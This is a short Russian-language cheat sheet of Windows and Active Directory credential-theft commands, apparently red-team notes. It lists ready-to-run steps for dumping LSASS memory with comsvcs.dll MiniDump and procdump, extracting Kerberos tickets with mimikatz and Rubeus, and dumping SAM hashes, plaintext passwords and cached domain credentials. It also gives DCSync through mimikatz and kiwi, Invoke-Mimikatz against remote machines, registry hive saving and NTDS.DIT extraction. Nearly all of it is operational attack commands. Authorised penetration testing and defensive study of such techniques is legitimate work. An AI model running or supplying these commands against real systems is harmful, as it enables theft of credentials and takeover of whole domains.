## Извлечение Kerberos-tickest через дамп виртуальной памяти:
**Три способа дампа памяти:**  
1) taskmgr.exe → ПКМ по lsass.exe → дамп памяти;  
2) rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full  
3) procdump.exe -ma lsass.exe /accepteula.  
  
Если дамп удалось создать, то билеты можно безопасно извлечь уже на своей стороне:  
mimikatz.exe -> sekurlsa::Minidump lsass.dmp -> sekurlsa::tickets /export  
  
## Извлечение Kerberos-tickest (Rubeus):  
**Список доступных тикетов**: Rubeus.exe triage  
**Извлекаем TGT пользователя**: Rubeus.exe dump /luid:0xfffff /service:krbtgt /nowrap  
**Aditional information**: Tickets for the service name krbtgt are Ticket Granting Tickets (TGTs) and others are Ticket Granting Service Tickets (TGSs).  

## Извлечение хешей SAM (нужны учетные данные пользователя):  
secretsdump.py [domain]/[username]:[password]@[TARGET IP]  

## Извлечение хешей SAM (mimikatz):  
\mimikatz.exe token::elevate lsadump::sam exit  

## Извлечение NTLM/plaintext passwords (mimikatz):  
\mimikatz.exe token::elevate sekurlsa::logonpasswords exit  

## Извлечение Kerberos Encryption Keys (mimikatz): extract aes256_hmac value  
\mimikatz.exe token::elevate sekurlsa::ekeys exit  

## Domain cached credentials:  
Позволяет исользовать учетные данные домена, если нет связи с DC.   
\mimikatz.exe token::elevate lsadump::cache exit  

## DCSync (mimikatz):  
\mimikatz.exe token::elevate lsadump::dcsync exit  

## Powershell mimikatz:  
1) Invoke-Mimikatz -DumpCreds  
2) Invoke-Mimikatz -DumpCreds -ComputerName@("comp1","comp2")  

## DCSync with Kiwi:  
load kiwi  
dcsync_ntlm username  

## Manualy dump registry with Reg:
reg.exe save hklm\sam c:\temp\sam.save -> reg.exe save hklm\security c:\temp\security.save -> reg.exe save hklm\system c:\temp\system.save

**Crack dumped registry data:  
1. creddump7\pwdump.py system sam  
2. secretsdump.py -system system -sam sam LOCAL  

## Retrieval of NTDS.DIT with ntdsutil:  
ntdsutil "activate instance ntds" ifm "create full C:\temp\ntdsutil" quit quit  

